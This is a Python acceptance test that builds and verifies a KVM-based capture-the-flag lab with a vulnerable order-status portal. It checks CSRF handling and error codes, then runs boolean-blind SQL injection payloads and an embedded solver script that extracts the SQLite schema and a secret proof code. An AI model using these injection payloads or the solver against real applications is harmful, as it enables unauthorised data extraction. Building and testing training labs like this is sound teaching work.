"""Real KVM acceptance for request-forge in a separate runtime; no live changes."""
import hashlib
import json
import re
import os
from pathlib import Path
import secrets
import shlex
import signal
import socket
import subprocess
import sys
import time
from types import SimpleNamespace
from uuid import uuid4

ROOT = Path(__file__).resolve().parents[1]
TEST_HOME = Path(os.environ.get('CRA_RF_TEST_HOME', '/home/crauser/cra-rf-v1'))
ORIGINAL_HOME = Path('/home/crauser/cra-m0-02')
os.environ['CRA_NODE_HOME'] = str(TEST_HOME)
sys.path[:0] = [str(ROOT / 'infra/linux'), str(ROOT / 'node')]
import runtime
import request_forge_recipe
import course_recipes

SUBNET = 197
BASE = 'http://192.168.%d.10:8081' % SUBNET


def guest(name, command):
    result = runtime.ssh(name, command, timeout=120)
    if result.returncode:
        raise RuntimeError('Synthetic guest command failed: ' + command + '\n' + result.stderr)
    return result.stdout.strip()


def main():
    assert TEST_HOME.parent == Path('/home/crauser') and TEST_HOME.name.startswith('cra-rf-v')
    assert 'kvm' in subprocess.check_output(['id', '-nG'], text=True).split()
    assert not TEST_HOME.exists(), 'Do not overwrite a previous validation runtime'
    check = subprocess.run([sys.executable, '-c',
        'from memory_budget import running_declarations,total_memory_mib; '
        'assert sum(r["memory_mib"] for r in running_declarations())+1792+4096<=total_memory_mib()'],
        env={**os.environ, 'CRA_NODE_HOME': str(ORIGINAL_HOME),
             'PYTHONPATH': str(ROOT / 'infra/linux') + ':' + str(ROOT / 'node')}, check=False)
    assert check.returncode == 0, 'Preserve live host memory reserve'
    for port in (29411, 29412, 23991):
        with socket.socket() as probe:
            probe.bind(('127.0.0.1', port))
    TEST_HOME.mkdir(mode=0o700)
    (TEST_HOME / '.local').mkdir()
    for name in ('toolchain', 'libvirt', 'images', 'lab-tools', 'course-tools'):
        (TEST_HOME / '.local' / name).symlink_to(ORIGINAL_HOME / '.local' / name, target_is_directory=True)
    owner = {key: str(uuid4()) for key in ('lab_id', 'organization_id', 'user_id')}
    owner['generation'] = 1
    (TEST_HOME / 'scope.json').write_text(json.dumps({'purpose': 'synthetic-request-forge-recipe', 'owner': owner}))
    result = {'status': 'FAIL', 'checks': [], 'cleanup_errors': []}
    output = ROOT / 'reports/local/request-forge/recipe.json'
    output.parent.mkdir(parents=True, exist_ok=True)
    created = []

    def passed(label):
        result['checks'].append(label)
        print('PASS: ' + label, flush=True)

    def create(generation, flag):
        owner['generation'] = generation
        prefix = 'cra-' + owner['lab_id'].replace('-', '')[:10] + '-' + format(generation, 'x')
        op, target = prefix + 'o', prefix + 't'
        for name, port, memory, role in [(target, 29412, 768, 'target'), (op, 29411, 1024, 'operator')]:
            created.append(name)
            runtime.prepare(name, port, memory, lab={'port': 23991, 'role': role, 'subnet': SUBNET}, ownership=owner)
            runtime.start(name)
        for name in (target, op):
            runtime.wait_ready(name)
            assert runtime.kvm_status(name)['enabled']
        for path, data in request_forge_recipe.pages().items():
            course_recipes.root_file(target, '/srv/cra-target/' + path, data, guest)
        service = '[Unit]\nDescription=Synthetic recipe landing page\n[Service]\nUser=www-data\nWorkingDirectory=/srv/cra-target\nExecStart=/usr/bin/python3 -m http.server 8080\n[Install]\nWantedBy=multi-user.target\n'
        course_recipes.root_file(target, '/etc/systemd/system/cra-target.service', service, guest)
        guest(target, 'sudo systemctl daemon-reload && sudo systemctl enable --now cra-target')
        request_forge_recipe.setup(SimpleNamespace(mission_id='request-forge'), target, [op],
                                   [{'subnet': SUBNET}], flag, guest)
        request_forge_recipe.check(None, target, [op], [{'subnet': SUBNET}], guest)
        return op, target

    def portal(op, method, path, body=None, cookie='', csrf='', kind='application/json'):
        parts = ['curl', '-sS', '--max-time', '5', '-o', '/tmp/body', '-w', '%{http_code}',
                 '-X', method, BASE + path]
        if body is not None:
            parts += ['-H', 'Content-Type: ' + kind, '--data-binary', body]
        if cookie:
            parts += ['-b', cookie]
        if csrf:
            parts += ['-H', 'X-CSRF-Token: ' + csrf]
        status = guest(op, ' '.join(shlex.quote(p) for p in parts))
        return status, guest(op, 'cat /tmp/body')

    def login2(op):
        guest(op, 'curl -sS -D /tmp/h2 -H "Content-Type: application/json" '
                  '--data-binary \'{"username":"auditor","password":"nordtele-lab-only"}\' '
                  + BASE + '/api/login > /tmp/l2.json')
        headers = guest(op, 'cat /tmp/h2')
        return (json.loads(guest(op, 'cat /tmp/l2.json'))['csrf'],
                'nt_session=' + re.search(r'nt_session=([^;]+)', headers).group(1))

    def remove(name):
        manifest = json.loads((runtime.STATE / 'vms' / name / 'manifest.json').read_text())
        assert manifest['ownership']['lab_id'] == owner['lab_id']
        runtime.destroy(name)
        created.remove(name)

    try:
        runtime.start_daemons()
        flag = 'CRA{' + secrets.token_hex(16) + '}'
        op, target = create(1, flag)
        passed('real x86_64 KVM pair; production recipe and portal ready')

        # Landing page, listener scope and the promised absence of target SSH/source.
        assert 'Ordrestatus' in guest(op, 'curl -sS --max-time 5 ' + BASE + '/')
        listeners = guest(target, "ss -ltnH 'sport = :8081'")
        assert '192.168.%d.10:8081' % SUBNET in listeners and '0.0.0.0:8081' not in listeners
        assert guest(op, "timeout 3 bash -c '</dev/tcp/192.168.%d.10/2222' && echo OPEN || echo CLOSED" % SUBNET) == 'CLOSED'
        assert guest(op, "timeout 3 bash -c '</dev/tcp/192.168.%d.10/22' && echo OPEN || echo CLOSED" % SUBNET) == 'OPEN'
        assert guest(op, "ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
                         "-o ConnectTimeout=3 -p 22 cra@192.168.%d.10 true >/dev/null 2>&1 && echo IN || echo OUT" % SUBNET) == 'OUT'
        files = sorted(guest(op, 'ls /home/cra/academy/request-forge').split())
        assert files == ['README.txt', 'mandat.txt', 'rapport.md'], files
        assert flag not in guest(op, 'grep -r CRA /home/cra/academy/request-forge || true')
        passed('portal only on lab NIC; no target SSH, source, database or flag on the operator')

        # Real session, CSRF and the documented error matrix.
        status, body = portal(op, 'POST', '/api/search', '{"reference":"NT-1042"}')
        assert status == '401', (status, body)
        guest(op, 'curl -sS -D /tmp/headers -H "Content-Type: application/json" '
                  '--data-binary \'{"username":"auditor","password":"nordtele-lab-only"}\' '
                  + BASE + '/api/login > /tmp/login.json')
        raw_login = guest(op, 'cat /tmp/login.json')
        raw_headers = guest(op, 'cat /tmp/headers || echo MISSING')
        result.setdefault('debug', {})['login'] = raw_login
        result['debug']['headers'] = raw_headers
        print('DEBUG login=' + raw_login, flush=True)
        print('DEBUG headers=' + raw_headers, flush=True)
        csrf = json.loads(raw_login)['csrf']
        cookie = 'nt_session=' + re.search(r'nt_session=([^;]+)', raw_headers).group(1)
        assert cookie != 'nt_session=', raw_headers
        matrix = {}
        matrix['no_csrf'] = portal(op, 'POST', '/api/search', '{"reference":"NT-1042"}', cookie)
        matrix['wrong_csrf'] = portal(op, 'POST', '/api/search', '{"reference":"NT-1042"}', cookie, 'wrong')
        matrix['wrong_type'] = portal(op, 'POST', '/api/search', '{"reference":"NT-1042"}', cookie, csrf, 'text/plain')
        matrix['wrong_field'] = portal(op, 'POST', '/api/search', '{"ref":"NT-1042"}', cookie, csrf)
        matrix['get'] = portal(op, 'GET', '/api/search')
        matrix['too_large'] = portal(op, 'POST', '/api/search', '{"reference":"' + 'A' * 4100 + '"}', cookie, csrf)
        matrix['unterminated'] = portal(op, 'POST', '/api/search', '{"reference":"NT-1042\'"}', cookie, csrf)
        result['debug']['matrix'] = {k: v[0] for k, v in matrix.items()}
        probe = guest(op, 'curl -sS -v -o /dev/null -b ' + shlex.quote(cookie) +
                      ' -H "Content-Type: application/json" --data-binary \'{"reference":"NT-1042"}\' ' +
                      BASE + '/api/search 2>&1 | sed -n "s/^> //p"')
        result['debug']['probe'] = probe
        print('DEBUG probe=' + probe, flush=True)
        print('DEBUG matrix=' + json.dumps(result['debug']['matrix']), flush=True)
        assert matrix['no_csrf'][0] == '403', matrix['no_csrf']
        assert matrix['wrong_csrf'][0] == '403', matrix['wrong_csrf']
        assert matrix['wrong_type'][0] == '415', matrix['wrong_type']
        assert matrix['wrong_field'][0] == '400', matrix['wrong_field']
        assert matrix['get'][0] == '405', matrix['get']
        assert matrix['too_large'][0] == '413', matrix['too_large']
        assert matrix['unterminated'][0] == '400', matrix['unterminated']
        assert json.loads(portal(op, 'POST', '/api/search', '{"reference":"NT-1042"}', cookie, csrf)[1]) == {'matched': True}
        assert json.loads(portal(op, 'POST', '/api/search', '{"reference":"NT-0000"}', cookie, csrf)[1]) == {'matched': False}
        passed('real login, session-bound CSRF and 400/401/403/405/413/415 matrix')

        # Controlled true/false pair, both orders, and database identification.
        def oracle(condition):
            payload = json.dumps({'reference': "NT-1042' AND (%s) -- " % condition})
            status, body = portal(op, 'POST', '/api/search', payload, cookie, csrf)
            assert status == '200', (condition, status, body)
            return json.loads(body)['matched']

        assert oracle('1=1') and not oracle('1=2')
        assert not oracle('1=2') and oracle('1=1')
        assert oracle("sqlite_version() LIKE '3.%'")
        passed('controlled injection pair in both orders; real SQLite identified')

        # Own bounded blind solver on the operator, as a student would write it.
        solver = r'''
import json, urllib.request, http.cookiejar
BASE = "http://192.168.197.10:8081"
jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
def post(path, data, csrf=""):
    req = urllib.request.Request(BASE + path, json.dumps(data).encode(),
        {"Content-Type": "application/json", "X-CSRF-Token": csrf})
    with opener.open(req, timeout=5) as r:
        return json.load(r)
csrf = post("/api/login", {"username": "auditor", "password": "nordtele-lab-only"})["csrf"]
count = 0
def oracle(expr):
    global count
    count += 1
    assert count < 10000
    body = post("/api/search", {"reference": "NT-1042' AND (%s) -- " % expr}, csrf)
    return body["matched"]
def number(expr, top):
    assert oracle("(%s) >= 0" % expr) and oracle("(%s) <= %d" % (expr, top))
    low, high = 0, top
    while low < high:
        mid = (low + high) // 2
        if oracle("(%s) > %d" % (expr, mid)): low = mid + 1
        else: high = mid
    assert oracle("(%s) = %d" % (expr, low))
    return low
def text(select, top=256):
    return "".join(chr(number("unicode(substr((%s),%d,1))" % (select, i), 127))
                   for i in range(1, number("length((%s))" % select, top) + 1))
table = text("SELECT name FROM sqlite_schema WHERE type='table' AND name!='orders' ORDER BY name LIMIT 1")
schema = text("SELECT sql FROM sqlite_schema WHERE name='%s'" % table)
code = text("SELECT proof_code FROM %s WHERE id=1" % table, 16)
print(json.dumps({"table": table, "schema": schema, "code": code, "requests": count}))
'''
        guest(op, "cat > /home/cra/solve.py <<'PY'\n" + solver + "\nPY")
        found = json.loads(guest(op, 'python3 /home/cra/solve.py'))
        assert found['table'] == 'audit_vault'
        assert 'proof_code TEXT' in found['schema']
        assert len(found['code']) == 16 and all(c in '0123456789abcdef' for c in found['code'])
        assert found['requests'] < 2500, found['requests']
        passed('blind schema and 16-char code discovered by own script in %d requests' % found['requests'])

        assert portal(op, 'POST', '/api/proof', json.dumps({'code': '0' * 16}), cookie, csrf)[0] == '403'
        status, body = portal(op, 'POST', '/api/proof', json.dumps({'code': found['code']}), cookie, csrf)
        assert status == '200' and json.loads(body)['flag'] == flag
        assert portal(op, 'POST', '/api/proof', json.dumps({'code': "x' OR 1=1 --"}), cookie, csrf)[0] == '403'
        passed('wrong and injected proofs rejected; derived code releases the generation flag')

        # Stop/start: same code, sessions cleared, service restored.
        for name in (op, target):
            runtime.virsh('shutdown', name)
        deadline = time.monotonic() + 60
        for name in (op, target):
            while runtime.virsh('domstate', name).stdout.strip() != 'shut off':
                if time.monotonic() > deadline:
                    raise RuntimeError('Synthetic shutdown deadline')
                time.sleep(1)
        for name in (target, op):
            runtime.start(name); runtime.wait_ready(name)
        request_forge_recipe.check(None, target, [op], [{'subnet': SUBNET}], guest)
        assert portal(op, 'POST', '/api/search', '{"reference":"NT-1042"}', cookie, csrf)[0] == '401'
        csrf2, cookie2 = login2(op)
        status, body = portal(op, 'POST', '/api/proof', json.dumps({'code': found['code']}), cookie2, csrf2)
        assert status == '200' and json.loads(body)['flag'] == flag
        passed('stop/start keeps the code, clears sessions and resumes the service')

        for name in (op, target):
            remove(name)
        new_flag = 'CRA{' + secrets.token_hex(16) + '}'
        op, target = create(2, new_flag)
        csrf3, cookie3 = login2(op)
        status, body = portal(op, 'POST', '/api/proof', json.dumps({'code': found['code']}), cookie3, csrf3)
        assert status == '403'
        status, body = portal(op, 'POST', '/api/proof', json.dumps({'code': __import__('hashlib').sha256(b'').hexdigest()}), cookie3, csrf3)
        assert status == '403'
        passed('fresh generation has a new code and rejects the previous one')
        result['status'] = 'PASS'
    except Exception as error:
        import traceback
        result['failure'] = traceback.format_exc()
        print(traceback.format_exc(), flush=True)
        raise
    finally:
        for name in list(reversed(created)):
            try:
                if (runtime.STATE / 'vms' / name / 'manifest.json').exists():
                    remove(name)
                else:
                    runtime.recover_pending(name)
            except Exception as error:
                result['cleanup_errors'].append(type(error).__name__ + ': ' + name)
        for daemon in ('libvirtd', 'virtlogd'):
            try:
                pidfile = runtime.STATE / (daemon + '.pid')
                if pidfile.exists():
                    pid = int(pidfile.read_text())
                    cmd = (Path('/proc') / str(pid) / 'cmdline').read_bytes()
                    assert str(TEST_HOME).encode() in cmd and daemon.encode() in cmd
                    handle = os.pidfd_open(pid)
                    signal.pidfd_send_signal(handle, signal.SIGTERM)
                    os.close(handle)
            except ProcessLookupError:
                pass
            except Exception as error:
                result['cleanup_errors'].append(type(error).__name__ + ': ' + daemon)
        output.write_text(json.dumps(result, indent=2) + '\n')
        if result['cleanup_errors']:
            raise RuntimeError('Synthetic cleanup incomplete; inspect recipe.json')


if __name__ == '__main__':
    main()
